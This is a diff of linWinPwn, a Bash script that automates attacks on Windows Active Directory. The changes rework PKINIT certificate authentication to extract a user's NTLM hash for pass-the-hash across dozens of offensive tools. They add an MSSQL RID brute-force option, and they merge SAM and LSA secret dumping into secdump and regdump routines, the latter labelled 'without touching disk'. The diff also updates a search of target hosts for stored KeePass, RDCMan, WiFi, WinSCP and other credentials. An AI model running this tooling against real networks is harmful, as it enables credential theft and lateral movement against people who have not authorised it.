@@ -85,7 +85,7 @@ if [ ! -f "${impacket_describeticket}" ]; then impacket_describeticket=$(which i
 enum4linux_py=$(which enum4linux-ng)
 if [ ! -f "${enum4linux_py}" ]; then enum4linux_py="$scripts_dir/enum4linux-ng.py"; fi
 bloodhound=$(which bloodhound-python)
-bloodhoundce=$(which bloodhound-python_ce)
+bloodhoundce=$(which bloodhound-ce-python)
 ldapdomaindump=$(which ldapdomaindump)
 smbmap=$(which smbmap)
 adidnsdump=$(which adidnsdump)
@@ -145,7 +145,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.0.34 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.0.35 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -221,7 +221,7 @@ while test $# -gt 0; do
         shift
         ;; #AES Key (128 or 256 bits)
     -C)
-        pfxcert="${2}"
+        pfxcert="$(realpath "${2}")"
         if [ ! "${pfxcert}" == "" ]; then cert_bool=true; fi
         shift
         ;; #location of PFX certificate
@@ -406,6 +406,10 @@ prepare() {
         exit 1
     else
         dc_info=$(${netexec} ldap --port "${ldap_port}" "${dc_ip}" | grep -v "Connection refused")
+        if [[ $dc_info == *"First time use detected"* ]]; then
+            dc_info=$(${netexec} ldap --port "${ldap_port}" "${dc_ip}" | grep -v "Connection refused")
+            #dc_info=$(${netexec} smb "${dc_ip}" | grep -v "Connection refused")
+        fi
         #dc_info=$(${netexec} smb "${dc_ip}" | grep -v "Connection refused")
     fi
 
@@ -600,72 +604,77 @@ authenticate() {
         auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}password of ${user}${NC}"
     fi
 
-    #Check if NTLM hash is used, and complete with empty LM hash / Check if Certificate is provided for PKINIT
+    #Check if Certificate is provided, extract NTLM hash using PKINIT
+    if [ "${cert_bool}" == true ]; then
+        echo -e "${YELLOW}[!]${NC} WARNING only netexec, ldeep , Certipy and bloodyAD currently support certificate authentication.${NC}"
+        echo -e "${YELLOW}[!]${NC} Extracting the NTLM hash of the user using PKINIT and using PtH for all other tools${NC}"
+        pkinit_auth
+        $(which openssl) pkcs12 -in "${pfxcert}" -out "${output_dir}/Credentials/${user}.pem" -nodes -passin pass:""
+        if [ -f "${output_dir}/Credentials/${user}.pem" ]; then
+            pem_cert="${output_dir}/Credentials/${user}.pem"
+            echo -e "${GREEN}[+] PFX Certificate converted to PEM successfully:${NC} '${output_dir}/Credentials/${user}.pem'"
+        fi
+
+    fi
+
+    #Check if NTLM hash is used, and complete with empty LM hash (also uses NTLM extracted from PKINIT)
     if [ "${hash_bool}" == true ] || [ "${cert_bool}" == true ]; then
-        if [ "${cert_bool}" == true ]; then
-            echo -e "${YELLOW}[!]${NC} WARNING only ldeep and bloodyAD currently support certificate authentication.${NC}"
-            echo -e "${YELLOW}[!]${NC} Extracting the NTLM hash of the user using PKINIT and using PtH for all other tools${NC}"
-            pkinit_auth
-            $(which openssl) pkcs12 -in "${pfxcert}" -out "${output_dir}/Credentials/${user}.pem" -nodes -passin pass:""
-            if [ -f "${output_dir}/Credentials/${user}.pem" ]; then
-                pem_cert="${output_dir}/Credentials/${user}.pem"
-                echo -e "${GREEN}[+] PFX Certificate converted to PEM successfully:${NC} '${output_dir}/Credentials/${user}.pem'"
+        if [[ (${#hash} -eq 65 && "${hash:32:1}" == ":") || (${#hash} -eq 33 && "${hash:0:1}" == ":") || (${#hash} -eq 32) ]]; then
+            if [ "$(echo "$hash" | grep ':')" == "" ]; then
+                hash=":"$hash
             fi
+            if [ "$(echo "$hash" | cut -d ":" -f 1)" == "" ]; then
+                hash="aad3b435b51404eeaad3b435b51404ee"$hash
+            fi
+            argument_ne="-d ${domain} -u '${user}' -H ${hash}"
+            argument_imp=" -hashes ${hash} ${domain}/'${user}'"
+            argument_imp_gp=" -hashes ${hash} ${domain}/'${user}'"
+            argument_imp_ti="-user '${user}' -hashes ${hash} -domain ${domain}"
+            argument_bhd="-u '${user}'\\@${domain} --hashes ${hash} --auth-method ntlm"
+            argument_enum4linux="-w ${domain} -u '${user}' -H ${hash:33}"
+            argument_adidns="-u ${domain}\\\\'${user}' -p ${hash}"
+            argument_ldd="-u ${domain}\\\\'${user}' -p ${hash}"
+            argument_smbmap="-d ${domain} -u '${user}' -p ${hash}"
+            argument_certi_py="${domain}/'${user}' --hashes ${hash}"
+            argument_certipy="-u '${user}'\\@${domain} -hashes ${hash}"
+            argument_pre2k="-d ${domain} -u '${user}' -hashes ${hash}"
+            argument_certsync="-d ${domain} -u '${user}' -hashes ${hash}"
+            argument_donpapi="-H ${hash} -d ${domain} -u '${user}'"
+            argument_hekatomb="-hashes ${hash} ${domain}/'${user}'"
+            argument_silenthd="-u ${domain}\\\\'${user}' --hashes ${hash}"
+            argument_windap="-d ${domain} -u '${user}' --hash ${hash}"
+            argument_targkerb="-d ${domain} -u '${user}' -H ${hash}"
+            argument_p0dalirius="-d ${domain} -u '${user}' -H ${hash:33})"
+            argument_FindUncom="-ad ${domain} -au '${user}' -ah ${hash}"
+            argument_manspider="-d ${domain} -u '${user}' -H ${hash:33}"
+            argument_coercer="-d ${domain} -u '${user}' --hashes ${hash}"
+            argument_aced=" -hashes ${hash} ${domain}/'${user}'"
+            argument_sccm="-d ${domain} -u '${user}' -hashes ${hash}"
+            argument_ldapper="-D ${domain} -U '${user}' -P ${hash}"
+            argument_ldeep="-d ${domain} -u '${user}' -H ${hash}"
+            argument_bloodyad="-d ${domain} -u '${user}' -p ${hash}"
+            argument_adalanche="--authmode ntlmpth --username '${user}'\\@${domain} --password ${hash}"
+            argument_mssqlrelay="-u '${user}'\\@${domain} -hashes ${hash}"
+            argument_pygpoabuse=" -hashes ${hash} ${domain}/'${user}'"
+            argument_GPOwned="-d ${domain} -u '${user}' -hashes ${hash}"
+            argument_privexchange="-d ${domain} -u '${user}' --hashes ${hash}"
+            argument_adcheck="-d ${domain} -u '${user}' -H ${hash}"
+            argument_evilwinrm="-u '${user}' -H ${hash:33}"
+            argument_godap="-u '${user}' -d ${domain} -H ${hash}"
+            argument_mssqlpwner="-hashes ${hash} ${domain}/'${user}'"
+            argument_soapy="--hash ${hash:33} ${domain}/'${user}'"
+        else
+            echo -e "${RED}[i]${NC} Incorrect format of NTLM hash..."
+            exit 1
+        fi
+        if [ "${cert_bool}" == true ]; then
             argument_bloodyad="-d ${domain} -u '${user}' -c ':${pem_cert}'"
             argument_ldeep="-d ${domain} -u '${user}' --pfx-file '${pfxcert}'"
             argument_evilwinrm="-u '${user}' -k '${pem_cert}'"
+            argument_ne="-d ${domain} -u '${user}' --pfx-cert '${pfxcert}'"
             auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}Certificate of $user located at $(realpath "$pfxcert")${NC}"
-            hash_bool=true
         else
-            if [[ (${#hash} -eq 65 && "${hash:32:1}" == ":") || (${#hash} -eq 33 && "${hash:0:1}" == ":") || (${#hash} -eq 32) ]]; then
-                if [ "$(echo "$hash" | grep ':')" == "" ]; then
-                    hash=":"$hash
-                fi
-                if [ "$(echo "$hash" | cut -d ":" -f 1)" == "" ]; then
-                    hash="aad3b435b51404eeaad3b435b51404ee"$hash
-                fi
-                argument_ne="-d ${domain} -u '${user}' -H ${hash}"
-                argument_imp=" -hashes ${hash} ${domain}/'${user}'"
-                argument_imp_gp=" -hashes ${hash} ${domain}/'${user}'"
-                argument_imp_ti="-user '${user}' -hashes ${hash} -domain ${domain}"
-                argument_bhd="-u '${user}'\\@${domain} --hashes ${hash} --auth-method ntlm"
-                argument_enum4linux="-w ${domain} -u '${user}' -H ${hash:33}"
-                argument_adidns="-u ${domain}\\\\'${user}' -p ${hash}"
-                argument_ldd="-u ${domain}\\\\'${user}' -p ${hash}"
-                argument_smbmap="-d ${domain} -u '${user}' -p ${hash}"
-                argument_certi_py="${domain}/'${user}' --hashes ${hash}"
-                argument_certipy="-u '${user}'\\@${domain} -hashes ${hash}"
-                argument_pre2k="-d ${domain} -u '${user}' -hashes ${hash}"
-                argument_certsync="-d ${domain} -u '${user}' -hashes ${hash}"
-                argument_donpapi="-H ${hash} -d ${domain} -u '${user}'"
-                argument_hekatomb="-hashes ${hash} ${domain}/'${user}'"
-                argument_silenthd="-u ${domain}\\\\'${user}' --hashes ${hash}"
-                argument_windap="-d ${domain} -u '${user}' --hash ${hash}"
-                argument_targkerb="-d ${domain} -u '${user}' -H ${hash}"
-                argument_p0dalirius="-d ${domain} -u '${user}' -H ${hash:33})"
-                argument_FindUncom="-ad ${domain} -au '${user}' -ah ${hash}"
-                argument_manspider="-d ${domain} -u '${user}' -H ${hash:33}"
-                argument_coercer="-d ${domain} -u '${user}' --hashes ${hash}"
-                argument_aced=" -hashes ${hash} ${domain}/'${user}'"
-                argument_sccm="-d ${domain} -u '${user}' -hashes ${hash}"
-                argument_ldapper="-D ${domain} -U '${user}' -P ${hash}"
-                argument_ldeep="-d ${domain} -u '${user}' -H ${hash}"
-                argument_bloodyad="-d ${domain} -u '${user}' -p ${hash}"
-                argument_adalanche="--authmode ntlmpth --username '${user}'\\@${domain} --password ${hash}"
-                argument_mssqlrelay="-u '${user}'\\@${domain} -hashes ${hash}"
-                argument_pygpoabuse=" -hashes ${hash} ${domain}/'${user}'"
-                argument_GPOwned="-d ${domain} -u '${user}' -hashes ${hash}"
-                argument_privexchange="-d ${domain} -u '${user}' --hashes ${hash}"
-                argument_adcheck="-d ${domain} -u '${user}' -H ${hash}"
-                argument_evilwinrm="-u '${user}' -H ${hash:33}"
-                argument_godap="-u '${user}' -d ${domain} -H ${hash}"
-                argument_mssqlpwner="-hashes ${hash} ${domain}/'${user}'"
-                argument_soapy="--hash ${hash:33} ${domain}/'${user}'"
-                auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}NTLM hash of '${user}'${NC}"
-            else
-                echo -e "${RED}[i]${NC} Incorrect format of NTLM hash..."
-                exit 1
-            fi
+            auth_string="${YELLOW}[i]${NC} Authentication method: ${YELLOW}NTLM hash of '${user}'${NC}"
         fi
         pass_bool=false
         kerb_bool=false
@@ -1130,8 +1139,7 @@ ne_smb_enum() {
         awk '!/\[-|\[+|\[\*/ && /SMB/ {gsub(/ +/, " "); split($12, arr, "\\"); print arr[2]}' "${output_dir}/DomainRecon/ne_users_nullsess_smb_${dc_domain}.txt" | grep -v "-Username-" >"${output_dir}/DomainRecon/Users/users_list_ne_smb_nullsess_${dc_domain}.txt" 2>&1
     else
         echo -e "${BLUE}[*] Users / Computers Enumeration (RPC authenticated)${NC}"
-        run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --users --log ${output_dir}/DomainRecon/ne_users_auth_smb_${dc_domain}.txt" 2>&1
-        grep -v "\[-\|\[+\|\[\*" "${output_dir}/DomainRecon/ne_users_auth_smb_${dc_domain}.txt" | grep SMB | sed 's/[ ][ ]*/ /g' | cut -d " " -f 12 | cut -d "\\" -f 2 | grep -v "-Username-" >"${output_dir}/DomainRecon/Users/users_list_ne_smb_${dc_domain}.txt" 2>&1
+        run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --users-export ${output_dir}/DomainRecon/Users/users_list_ne_smb_${dc_domain}.txt --log ${output_dir}/DomainRecon/ne_users_auth_smb_${dc_domain}.txt" 2>&1
         run_command "${netexec} ${ne_verbose} smb ${target} ${argument_ne} --computers" >"${output_dir}/DomainRecon/ne_computers_auth_smb_${dc_domain}.txt"
     fi
     parse_users
@@ -1150,8 +1158,7 @@ ne_ldap_enum() {
         grep -vE '\[-|\[+|\[\*' "${output_dir}/DomainRecon/ne_users_nullsess_ldap_${dc_domain}.txt" 2>/dev/null | grep LDAP | tr -s ' ' | cut -d ' ' -f 12 | grep -v "-Username-" >"${output_dir}/DomainRecon/Users/users_list_ne_ldap_nullsess_${dc_domain}.txt" 2>&1
     else
         echo -e "${BLUE}[*] Users Enumeration (LDAP authenticated)${NC}"
-        run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} ${ldaps_param} --users --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_auth_ldap_${dc_domain}.txt" 2>&1
-        grep -vE '\[-|\[+|\[\*' "${output_dir}/DomainRecon/ne_users_auth_ldap_${dc_domain}.txt" 2>/dev/null | grep LDAP | tr -s ' ' | cut -d ' ' -f 12 | grep -v "-Username-" >"${output_dir}/DomainRecon/Users/users_list_ne_ldap_${dc_domain}.txt" 2>&1
+        run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} ${ldaps_param} --users-export ${output_dir}/DomainRecon/Users/users_list_ne_ldap_${dc_domain}.txt --kdcHost ${dc_FQDN} --log ${output_dir}/DomainRecon/ne_users_auth_ldap_${dc_domain}.txt" 2>&1
     fi
     parse_users
     echo -e ""
@@ -2651,16 +2658,10 @@ coerceplus_check() {
     echo -e ""
 }
 
-spooler_check() {
-    echo -e "${BLUE}[*] Print Spooler check ${NC}"
+print_check() {
+    echo -e "${BLUE}[*] Print Spooler and PrintNightmare checks ${NC}"
     smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M spooler --log ${output_dir}/Vulnerabilities/ne_spooler_output_${dc_domain}.txt" 2>&1
-    echo -e ""
-}
-
-printnightmare_check() {
-    echo -e "${BLUE}[*] Print Nightmare check ${NC}"
-    smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M printnightmare --log ${output_dir}/Vulnerabilities/ne_printnightmare_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
@@ -2682,24 +2683,12 @@ smbsigning_check() {
     echo -e ""
 }
 
-ntlmv1_check() {
-    echo -e "${BLUE}[*] ntlmv1 check ${NC}"
+smb_checks() {
+    echo -e "${BLUE}[*] ntlmv1, smbghost, remove-mic checks ${NC}"
     smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M ntlmv1 --log ${output_dir}/Vulnerabilities/ne_ntlmv1_output_${dc_domain}.txt" 2>&1
-    echo -e ""
-}
-
-smbghost_check() {
-    echo -e "${BLUE}[*] smbghost check ${NC}"
-    smb_scan
     run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M smbghost --log ${output_dir}/Vulnerabilities/ne_smbghost_output_${dc_domain}.txt" 2>&1
-    echo -e ""
-}
-
-runasppl_check() {
-    echo -e "${BLUE}[*] runasppl check ${NC}"
-    smb_scan
-    run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M runasppl --log ${output_dir}/Vulnerabilities/ne_runasppl_output_${dc_domain}.txt" 2>&1
+    run_command "${netexec} ${ne_verbose} smb ${servers_smb_list} ${argument_ne} -M remove-mic --log ${output_dir}/Vulnerabilities/ne_removemic_output_${dc_domain}.txt" 2>&1
     echo -e ""
 }
 
@@ -2817,7 +2806,10 @@ mssql_enum() {
             grep -i "$(echo "$i" | cut -d "." -f 1)" "${output_dir}/DomainRecon/dns_records_${dc_domain}.csv" 2>/dev/null | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 | sort -u >"${sql_ip_list}"
         done
         if [ -f "${target_sql}" ]; then
-            run_command "${netexec} ${ne_verbose} mssql --port ${ldap_port} ${target_sql} ${argument_ne} -M mssql_priv --log ${output_dir}/MSSQL/ne_mssql_priv_output_${dc_domain}.txt" 2>&1
+            run_command "${netexec} ${ne_verbose} mssql --port ${ldap_port} ${target_sql} ${argument_ne} -M mssql_priv --log ${output_dir}/MSSQL/ne_mssql_output_${dc_domain}.txt" 2>&1
+            run_command "${netexec} ${ne_verbose} mssql --port ${ldap_port} ${target_sql} ${argument_ne} -M enum_impersonate --log ${output_dir}/MSSQL/ne_mssql_output_${dc_domain}.txt" 2>&1
+            run_command "${netexec} ${ne_verbose} mssql --port ${ldap_port} ${target_sql} ${argument_ne} -M enum_logins --log ${output_dir}/MSSQL/ne_mssql_output_${dc_domain}.txt" 2>&1
+            run_command "${netexec} ${ne_verbose} mssql --port ${ldap_port} ${target_sql} ${argument_ne} -M enum_links --log ${output_dir}/MSSQL/ne_mssql_output_${dc_domain}.txt" 2>&1
         else
             echo -e "${PURPLE}[-] No SQL servers found! Please re-run SQL enumeration and try again..${NC}"
         fi
@@ -2879,6 +2871,21 @@ mssqlpwner_console() {
             run_command "${mssqlpwner} ${argument_mssqlpwner}@${mssqlpwner_target} -dc-ip ${dc_ip} -windows-auth interactive" | tee -a "${output_dir}/MSSQL/mssqlpwner_output_${dc_domain}.txt" 2>&1
             cd "${current_dir}" || exit
         fi
+    fi
+    echo -e ""
+}
+
+mssql_ridbrute_attack() {
+    if [ "${nullsess_bool}" == true ]; then
+        echo -e "${BLUE}[*] MSSQL RID Brute Force (Null session)${NC}"
+        run_command "${netexec} ${ne_verbose} mssql ${target} ${argument_ne} --rid-brute --log ${output_dir}/BruteForce/ne_mssql_brute_${dc_domain}.txt"
+        run_command "${netexec} ${ne_verbose} mssql ${target} -u Guest -p '' --rid-brute --log ${output_dir}/BruteForce/ne_mssql_brute_${dc_domain}.txt"
+        run_command "${netexec} ${ne_verbose} mssql ${target} -u ${rand_user} -p '' --rid-brute --log ${output_dir}/BruteForce/ne_mssql_brute_${dc_domain}.txt"
+        #Parsing user lists
+        grep "SidTypeUser" "${output_dir}/BruteForce/ne_mssql_rid_brute_${dc_domain}.txt" | cut -d "\\" -f 2 | sort -u | sed "s/ (SidTypeUser)//g" >"${output_dir}/DomainRecon/Users/users_list_mssql_ridbrute_${dc_domain}.txt" 2>&1
+        parse_users
+    else
+        echo -e "${PURPLE}[-] Null session RID brute force skipped (credentials provided)${NC}"
     fi
     echo -e ""
 }
@@ -3384,12 +3391,12 @@ juicycreds_dump() {
     smb_scan
     for i in $(/bin/cat "${servers_smb_list}"); do
         echo -e "${CYAN}[*] Searching in ${i} ${NC}"
-        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M firefox --log ${output_dir}/Credentials/firefox_${dc_domain}_${i}.txt" 2>&1
         run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M keepass_discover --log ${output_dir}/Credentials/keepass_discover_${dc_domain}_${i}.txt" 2>&1
         run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M rdcman --log ${output_dir}/Credentials/rdcman_${dc_domain}_${i}.txt" 2>&1
         run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M teams_localdb --log ${output_dir}/Credentials/teams_localdb_${dc_domain}_${i}.txt" 2>&1
         run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M wifi --log ${output_dir}/Credentials/wifi_${dc_domain}_${i}.txt" 2>&1
         run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M winscp --log ${output_dir}/Credentials/winscp_${dc_domain}_${i}.txt" 2>&1
+        run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} -M snipped --log ${output_dir}/Credentials/snipped_${dc_domain}_${i}.txt" 2>&1
     done
     echo -e ""
 }
@@ -3476,29 +3483,32 @@ ntds_dump() {
     echo -e ""
 }
 
-sam_dump() {
-    echo -e "${BLUE}[*] Dumping SAM credentials${NC}"
+samlsa_dump() {
+    echo -e "${BLUE}[*] Dumping LSA SAM credentials (secdump) ${NC}"
     if [ "${nullsess_bool}" == true ]; then
-        echo -e "${PURPLE}[-] SAM dump requires credentials${NC}"
+        echo -e "${PURPLE}[-] LSA SAM dump requires credentials${NC}"
     else
         smb_scan
         for i in $(/bin/cat "${servers_smb_list}"); do
-            echo -e "${CYAN}[*] SAM dump of ${i} ${NC}"
-            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --sam --log ${output_dir}/Credentials/sam_dump_${dc_domain}_${i}.txt" 2>&1
+            echo -e "${CYAN}[*] SAM LSA dump of ${i} ${NC}"
+            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --sam secdump --log ${output_dir}/Credentials/sam_dump_${dc_domain}_${i}.txt" 2>&1
+            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --lsa secdump --log ${output_dir}/Credentials/lsa_dump_${dc_domain}_${i}.txt" 2>&1
+
         done
     fi
     echo -e ""
 }
 
-lsa_dump() {
-    echo -e "${BLUE}[*] Dumping LSA credentials${NC}"
+samlsa_reg_dump() {
+    echo -e "${BLUE}[*] Dumping LSA SAM credentials (regdump) ${NC}"
     if [ "${nullsess_bool}" == true ]; then
-        echo -e "${PURPLE}[-] LSA dump requires credentials${NC}"
+        echo -e "${PURPLE}[-] LSA SAM dump requires credentials${NC}"
     else
         smb_scan
         for i in $(/bin/cat "${servers_smb_list}"); do
-            echo -e "${CYAN}[*] LSA dump of ${i} ${NC}"
-            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --lsa --log ${output_dir}/Credentials/lsa_dump_${dc_domain}_${i}.txt" 2>&1
+            echo -e "${CYAN}[*] SAM LSA dump of ${i} ${NC}"
+            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --sam regdump --log ${output_dir}/Credentials/sam_reg_dump_${dc_domain}_${i}.txt" 2>&1
+            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --lsa regdump --log ${output_dir}/Credentials/lsa_reg_dump_${dc_domain}_${i}.txt" 2>&1
         done
     fi
     echo -e ""
@@ -3569,7 +3579,6 @@ dpapi_dump() {
         for i in $(/bin/cat "${servers_smb_list}"); do
             echo -e "${CYAN}[*] DPAPI dump of ${i} using netexec ${NC}"
             run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --dpapi cookies --log ${output_dir}/Credentials/dpapi_dump_${dc_domain}_${i}.txt" 2>&1
-            run_command "${netexec} ${ne_verbose} smb ${i} ${argument_ne} --dpapi nosystem --log ${output_dir}/Credentials/dpapi_dump_${dc_domain}_${i}.txt" 2>&1
         done
     fi
     echo -e ""
@@ -3833,13 +3842,10 @@ vuln_checks() {
     mkdir -p "${output_dir}/Vulnerabilities"
     zerologon_check
     ms17-010_check
-    spooler_check
-    printnightmare_check
+    print_check
     webdav_check
     coerceplus_check
-    smbsigning_check
-    ntlmv1_check
-    runasppl_check
+    smb_checks
     rpcdump_check
     ldapnightmare_check
 }
@@ -3982,7 +3988,7 @@ pkinit_auth() {
         run_command "${certipy} cert -export -pfx $(realpath "$pfxcert") -password $pfxpass -out '${user}_unprotected.pfx'" | tee "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt"
         run_command "${certipy} auth -pfx '${user}_unprotected.pfx' -dc-ip ${dc_ip} -username '${user}' -domain ${domain}" | tee -a "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt"
     fi
-    hash=$(grep "Got hash for" "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt" | cut -d ":" -f 2,3| cut -d " " -f 2)
+    hash=$(grep "Got hash for" "${output_dir}/Credentials/certipy_PKINIT_output_${dc_domain}.txt" | cut -d ":" -f 2,3 | cut -d " " -f 2 | tr -d '[:space:]')
     echo -e "${GREEN}[+] NTLM hash extracted:${NC} $hash"
     cd "${current_dir}" || exit
 }
@@ -4329,6 +4335,7 @@ bruteforce_menu() {
     echo -e "8) Password spraying using kerbrute (Noisy!)"
     echo -e "9) Password spraying using netexec - ldap (Noisy!)"
     echo -e "10) Timeroast attack against NTP"
+    echo -e "11) MSSQL RID Brute Force (Null session) using netexec"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -4387,6 +4394,11 @@ bruteforce_menu() {
 
     10)
         ne_timeroast
+        bruteforce_menu
+        ;;
+
+    11)
+        mssql_ridbrute_attack
         bruteforce_menu
         ;;
 
@@ -4964,19 +4976,16 @@ vulns_menu() {
     echo -e "m) Modify target(s)"
     echo -e "1) zerologon check using netexec (only on DC)"
     echo -e "2) MS17-010 check using netexec"
-    echo -e "3) Print Spooler check using netexec"
-    echo -e "4) Printnightmare check using netexec"
-    echo -e "5) WebDAV check using netexec"
-    echo -e "6) coerce check using netexec"
-    echo -e "7) SMB signing check using netexec"
-    echo -e "8) ntlmv1 check using netexec"
-    echo -e "9) runasppl check using netexec"
-    echo -e "10) smbghost check using netexec"
-    echo -e "11) RPC Dump and check for interesting protocols"
-    echo -e "12) Coercer RPC scan"
-    echo -e "13) PushSubscription abuse using PrivExchange"
-    echo -e "14) RunFinger scan"
-    echo -e "15) Run LDAPNightmare check"
+    echo -e "3) Print Spooler and Printnightmare checks using netexec"
+    echo -e "4) WebDAV check using netexec"
+    echo -e "5) coerce check using netexec"
+    echo -e "6) SMB signing check using netexec"
+    echo -e "7) ntlmv1, smbghost and remove-mic checks using netexec"
+    echo -e "8) RPC Dump and check for interesting protocols"
+    echo -e "9) Coercer RPC scan"
+    echo -e "10) PushSubscription abuse using PrivExchange"
+    echo -e "11) RunFinger scan"
+    echo -e "12) Run LDAPNightmare check"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -5004,66 +5013,51 @@ vulns_menu() {
         ;;
 
     3)
-        spooler_check
+        print_check
         vulns_menu
         ;;
 
     4)
-        printnightmare_check
-        vulns_menu
-        ;;
-
-    5)
         webdav_check
         vulns_menu
         ;;
 
-    6)
+    5)
         coerceplus_check
         vulns_menu
         ;;
 
-    7)
+    6)
         smbsigning_check
         vulns_menu
         ;;
 
+    7)
+        smb_checks
+        vulns_menu
+        ;;
+
     8)
-        ntlmv1_check
-        vulns_menu
-        ;;
-
-    9)
-        runasppl_check
-        vulns_menu
-        ;;
-
-    10)
-        smbghost_check
-        vulns_menu
-        ;;
-
-    11)
         rpcdump_check
         vulns_menu
         ;;
 
-    12)
+    9)
         coercer_check
         vulns_menu
         ;;
 
-    13)
+    10)
         privexchange_check
         vulns_menu
         ;;
 
-    14)
+    11)
         runfinger_check
         vulns_menu
         ;;
 
-    15)
+    12)
         ldapnightmare_check
         vulns_menu
         ;;
@@ -5162,8 +5156,8 @@ pwd_menu() {
         echo -e "4) Dump SAM and LSA using secretsdump"
         echo -e "5) Dump SAM and SYSTEM using reg"
         echo -e "6) Dump NTDS using netexec"
-        echo -e "7) Dump SAM using netexec"
-        echo -e "8) Dump LSA secrets using netexec"
+        echo -e "7) Dump SAM and LSA secrets using netexec"
+        echo -e "8) Dump SAM and LSA secrets using netexec without touching disk (regdump)"
         echo -e "9) Dump LSASS using lsassy"
         echo -e "10) Dump LSASS using handlekatz"
         echo -e "11) Dump LSASS using procdump"
@@ -5171,7 +5165,7 @@ pwd_menu() {
         echo -e "13) Dump dpapi secrets using netexec"
         echo -e "14) Dump secrets using DonPAPI"
         echo -e "15) Dump secrets using hekatomb (only on DC)"
-        echo -e "16) Search for juicy credentials (Firefox, KeePass, Rdcman, Teams, WiFi, WinScp)"
+        echo -e "16) Search for juicy credentials (KeePass, Rdcman, Teams, WiFi, WinScp, Snipped)"
         echo -e "17) Dump Veeam credentials (only from Veeam server)"
         echo -e "18) Dump Msol password (only from Azure AD-Connect server)"
         echo -e "19) Extract Bitlocker Keys"
@@ -5223,12 +5217,12 @@ pwd_menu() {
         ;;
 
     7)
-        sam_dump
+        samlsa_dump
         pwd_menu
         ;;
 
     8)
-        lsa_dump
+        samlsa_reg_dump
         pwd_menu
         ;;
 
